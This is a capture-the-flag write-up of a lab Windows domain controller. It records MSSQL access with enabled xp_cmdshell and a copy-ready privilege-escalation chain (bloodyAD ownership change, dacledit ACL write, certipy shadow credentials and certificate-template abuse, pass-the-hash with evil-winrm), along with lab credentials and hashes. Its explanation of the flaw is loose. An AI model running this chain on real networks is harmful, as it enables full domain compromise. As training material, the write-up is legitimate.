# ENUMERATION
---

## OPEN PORTS
---



| IP ADDRESS  |
| ----------- |
| 10.10.11.51 |


| PORT     | SERVICE      |
| -------- | ------------ |
| 53/tcp   | domain       |
| 88/tcp   | kerberos-sec |
| 135/tcp  | msrpc        |
| 139/tcp  | netbios-ssn  |
| 389/tcp  | ldap         |
| 445/tcp  | microsoft-ds |
| 464/tcp  | kpasswd5     |
| 593/tcp  | ncacn_http   |
| 636/tcp  | ssl/ldap     |
| 1433/tcp | ms-sql-s     |
| 3268/tcp | ldap         |
| 3269/tcp | ssl/ldap     |
| 5985/tcp | http         |

We got a lot of open ports, this is a Windows machine, let's start reconnaissance.

# RECONNAISSANCE
---

At first, we are already given some credentials:

```ad-note

`rose`:`KxEPkKe6R8su`
```

We can start with some basic SMB enumeration:

```ad-hint
We got a few shares, most interesting one would be `Accounting Deparment` one, let's take a look at it:


We have two files, let's download them both and check the contents:


Since they are zip files, we need to unzip them and review the contents:


After an extensive search, we can see that `xl/sharedStrings.xml` is a file that contains credentials to `mssql`, we can connect using the `mssqlclient.py` script from [impacket](https://github.com/fortra/impacket)
```

# EXPLOITATION
---

Let's connect:

```ad-hint
##### Used
---
`mssqlclient.py 'sa:MSSQLP@ssw0rd!'@10.10.11.51`


We can now begin with enumeration, for this, we can use help to check which commands are available:

It seems like we can enable some sort of shell, I asked chatgpt about it and it said I must follow these steps:

1. `enable_xp_cmdshell`
2. `RECONFIGURE;`
3. `EXEC xp_cmdshell 'command';`

Once I did that, this happened:

We get some sort of `RCE`, let's try to enumerate `C:\` folder:

We got an user: `ryan`, tried to check the contents but it was empty, we can follow another route, we already know we have a `SQL2019` directory, there must be a SQL configuration file we can read and get some credentials:


That's right, let's read the configuration file:



We got credentials for another user.
```


```ad-note
`sql_svc`:`WqSZAF6CysDQbGb3`
```


Since we also know the domain is called `SEQUEL`, we can use `evil-winrm` to log in:

![Pasted image 20250114193709.png](../../IMAGES/Pasted%20image%2020250114193709.png)

We are unable to log with those credentials, but remember we have another user, `ryan`, let's try with that username:


![Pasted image 20250114193750.png](../../IMAGES/Pasted%20image%2020250114193750.png)

And we're in, let's read `user.txt`:

```ad-important

User: `1c3847c8cc30b9afd12ff6c2bc86f0db`
```

Let's begin PRIVESC.

# PRIVILEGE ESCALATION
---


For privilege escalation, we can use tools like `bloodyAD`, `dacledit.py` and `certipy-ad` (I used Kali Linux in this part), let's follow these steps:

```ad-hint
1. `python3 bloodyAD.py --host DC01.sequel.htb -d SEQUEL.HTB -u ryan -p WqSZAF6CysDQbGb3 set owner ca_svc ryan`
2. `dacledit.py -action 'write' -rights 'FullControl' -principal ryan -target ca_svc SEQUEL.HTB/ryan:'WqSZAF6CysDQbGb3'`
3. `certipy-ad shadow auto -u ryan@SEQUEL.HTB -p 'WqSZAF6CysDQbGb3' -dc-ip 10.10.11.51 -ns 10.10.11.51 -target DC01.sequel.htb -account ca_svc`
4. `KRB5CCNAME=$PWD/ca_svc.ccache certipy-ad find -scheme ldap -k -debug -target dc01.sequel.htb -dc-ip 10.10.11.51 -vulnerable -stdout`
5. `KRB5CCNAME=$PWD/ca_svc.ccache certipy-ad template -k -template DunderMifflinAuthentication -target dc01.sequel.htb -dc-ip 10.10.11.51`
6. `certipy-ad req -u ca_svc -hashes :3b181b914e7a9d5508ea1e20bc2b7fce -ca sequel-DC01-CA -target dc01.sequel.htb -dc-ip 10.10.11.51 -template DunderMifflinAuthentication -upn Administrator@SEQUEL.HTB -ns 10.10.11.51 -dns 10.10.11.51 -debug`
7. `certipy-ad auth -pfx administrator_10.pfx -dc-ip 10.10.11.51`
8. `evil-winrm -i 10.10.11.51 -u 'administrator' -H '7a8d4e04986afa8ed4060f75e5a0b3ff'`
```


So, explanation of this PRIVESC is that we're abusing the CA:

```ad-important
- Identified that the `Certificate Authority (CA)` has a misconfiguration where a vulnerable template called `DunderMifflinAuthentication` is available. This template is part of the certificate services and allows for certain users (like `Domain Admins`) to request certificates with **elevated privileges**.
- The vulnerability identified was that `Cert Publishers` (a group with a dangerous permission set) have access to request certificates. **Cert Publishers** are not typically expected to have these rights, which opens the door for attackers.
```

With this, we are able to obtain a certificate as administrator, thus, obtaining the hash for Admin user, making us able to perform [Pass the hash](https://www.beyondtrust.com/resources/glossary/pass-the-hash-pth-attack)
Like that, we can read root flag:

![Pasted image 20250115141448.png](../../IMAGES/Pasted%20image%2020250115141448.png)

```ad-important
Root: `63404c844597a9eef0c7a440b65564a3`
```

